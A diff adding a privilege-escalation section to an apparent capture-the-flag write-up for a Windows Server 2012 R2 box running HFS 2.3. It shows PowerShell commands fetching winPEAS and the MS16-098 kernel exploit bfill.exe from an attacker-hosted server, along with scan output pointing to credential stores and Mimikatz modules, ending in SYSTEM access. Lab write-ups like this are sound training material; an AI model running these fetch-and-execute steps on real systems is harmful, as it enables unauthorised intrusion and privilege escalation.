@@ -5,16 +5,17 @@
 
 ## Summary
 
-* Windows Server 2012 R2 with a file server running on port 80
-* RCE exists for the file server, HFS 2.3
-* Simple web server to host nc.exe and a python script is enough to get a reverse shell
+* Windows Server 2012 R2 with a file server running on port 80.
+* RCE exists for the file server, HFS 2.3.
+* Simple web server to host nc.exe and a python script is enough to get a reverse shell.
+* Privilege escalation was difficult.  Found a kernel exploit for MS16-098 that worked.
 
 ## Tools needed
 
 * Python with http.server module
 * searchsploit
 * nc
-
+* An exploit suggester.  I tried winPEAS, but should have used Sherlock or Windows-Exploit-Suggester.
 
 ## Detection 
 
@@ -156,6 +157,251 @@ For some reason the first execution of 39161.py didn't take.  On the second atte
 
 
 ## Privilege Escalation
+
+So I'm completely stuck on privilege escalation so I'll need a tool.  As I already have an HTTP server running, I thought I should try winPEAS.
+
+```
+#git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+#cd privilege-escalation-awesome-scripts-suite/winPEAS/winPEASbat
+#cp winPEAS.bat ../../../web/.
+#cd ../../../web/.
+# ls
+nc.exe  winPEAS.bat
+```
+
+Now let's download winPEAS using `Invoke-WebRequest` and run it.
+
+```
+C:\Users\kostas\Desktop>cd %TEMP%
+C:\Users\kostas\AppData\Local\Temp>powershell.exe -c "Invoke-WebRequest -Uri http://10.10.14.10:80/winPEAS.bat -OutFile winPEAS.bat"
+     
+C:\Users\kostas\AppData\Local\Temp>winPEAS.bat                                                                                                                                                
+winPEAS.bat                                                                                                                                                                                   
+                                                                                                                                                                                              
+            ((,.,/((((((((((((((((((((/,  */                                                                                                                                                  
+                                                                                                                                                                                              
+ [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS                                                                                                                                          
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                                        
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                 
+                                                                                                                                                                                              
+C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                              
+                                                                                                                                                                                              
+C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                     
+                                                                                                                                                                                              
+C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(F)                                                                                               
+                                                                                                                                                                                              
+C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(F)                                                                                                                  
+                                                                                                                                                                                              
+C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe BUILTIN\Administrators:(F)                                                                                       
+                                                                                               
+C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe BUILTIN\Administrators:(F)
+                                                                                               
+                                                                                               
+ [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                              
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+                                                                                               
+ [+] UNQUOTED SERVICE PATHS                                                                    
+   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Progam.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Pro
+gram Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'            
+   [i] The permissions are also checked and filtered using icacls                              
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services         
+NetTcpPortSharing                  
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe 
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)  
+                                               
+PerfHost 
+ C:\Windows\SysWow64\perfhost.exe 
+C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
+
+TrustedInstaller 
+ C:\Windows\servicing\TrustedInstaller.exe 
+C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
+
+[*] DLL HIJACKING in PATHenv variable                                                                                                                                                [118/546]
+   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations                                                                                      
+   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate 
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
+ 
+C:\Windows NT SERVICE\TrustedInstaller:(F)
+ 
+C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)
+ 
+
+[*] CREDENTIALS
+
+ [+] WINDOWS VAULT
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault
+
+Currently stored credentials:
+
+* NONE *
+
+
+ [+] Unattended files
+
+ [+] SAM and SYSTEM backups
+
+ [+] McAffee SiteList.xml
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+
+C:\Windows\Panther\setupinfo
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_01f46dab888fca48\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_0c4917fdbcf08c43\appcmd.exe
+
+---
+Scan complete.
+ [+] GPP Password
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+
+ [+] Cloud Credentials
+
+ [+] AppCmd
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+
+ [+] Files in registry that may contain credentials
+   [i] Searching specific files that may contains credentials.
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+Looking inside HKCU\Software\ORL\WinVNC3\Password
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
+    DefaultDomainName    REG_SZ    
+    DefaultUserName    REG_SZ    
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
+Looking inside HKCU\Software\TightVNC\Server
+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
+Looking inside HKCU\Software\OpenSSH\Agent\Keys 
+C:\Windows\Panther\setupinfo
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_01f46dab888fca48\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml                                                                        [31/546]
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_0c4917fdbcf08c43\appcmd.exe
+
+---
+Scan complete.
+
+ [+] DPAPI MASTER KEYS
+   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+
+
+    Directory: C:\Users\kostas\AppData\Roaming\Microsoft\Protect
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d---s         18/3/2017   1:57             S-1-5-21-605891470-2991919448-8120
+                                             5106-1001                         
+
+ [+] DPAPI MASTER KEYS
+   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
+   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+
+Looking inside C:\Users\kostas\AppData\Roaming\Microsoft\Credentials\
+Looking inside C:\Users\kostas\AppData\Local\Microsoft\Credentials\
+
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
+    DefaultDomainName    REG_SZ    
+    DefaultUserName    REG_SZ    
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
+Looking inside HKCU\Software\TightVNC\Server
+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
+Looking inside HKCU\Software\OpenSSH\Agent\Keys 
+C:\Windows\Panther\setupinfo
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_01f46dab888fca48\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_0c4917fdbcf08c43\appcmd.exe
+
+---
+Scan complete.
+```
+
+Unfortuately the above didn't get me anything useful (or I'm just bad at interpreting the results), but either way I'm stuck.
+
+Resorting to Google, I searched for "Windows 2012 R2 privilege" and found quite a few references to MS16-098. I came across some kernel exploits here: https://github.com/SecWiki/windows-kernel-exploits/
+
+```
+#git clone https://github.com/SecWiki/windows-kernel-exploits.git
+#cd windows-kernel-exploits/MS16-098
+#cp bfill.exe ../../web/.
+#ls
+bfill.exe  nc.exe  winPEAS.bat
+```
+
+Download bfill.exe with `Invoke-WebRequest` and run it.
+
+C:\Users\kostas\Desktop>cd %TEMP%
+C:\Users\kostas\AppData\Local\Temp>powershell.exe -c "Invoke-WebRequest -Uri http://10.10.14.10:80/bfill.exe -OutFile bfill.exe"
+C:\Users\kostas\AppData\Local\Temp>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\kostas\AppData\Local\Temp
+
+25/10/2020  03:40     <DIR>          .
+25/10/2020  03:40     <DIR>          ..
+25/10/2020  03:40            560.128 bfill.exe
+18/03/2017  02:57     <DIR>          Low
+               1 File(s)        560.128 bytes
+               3 Dir(s)  31.886.508.032 bytes free
+
+C:\Users\kostas\AppData\Local\Temp>bfill.exe
+bfill.exe
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\AppData\Local\Temp>whoami
+whoami
+nt authority\system
+```
+
+Success! 
+
 
 
 
